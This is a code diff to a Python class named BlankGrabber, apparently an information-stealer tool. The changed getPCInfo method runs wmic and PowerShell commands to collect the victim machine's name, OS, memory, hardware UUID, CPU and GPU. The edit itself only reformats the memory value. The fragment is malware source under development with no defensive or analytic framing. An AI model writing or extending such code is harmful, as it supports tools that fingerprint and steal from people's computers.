@@ -635,7 +635,7 @@ class BlankGrabber:
     def getPCInfo(self):
         self.ComputerName = os.getenv("computername")
         self.ComputerOS = force_decode(subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout).strip().splitlines()[2].strip()
-        self.TotalMemory = int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)
+        self.TotalMemory = str(int(int(force_decode(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout).strip().split()[1])/1000000000)) + " GB"
         self.HWID = force_decode(subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout).strip().split()[1]
         self.CPU = force_decode(subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout).strip()
         self.GPU = force_decode(subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout).splitlines()[2].strip()
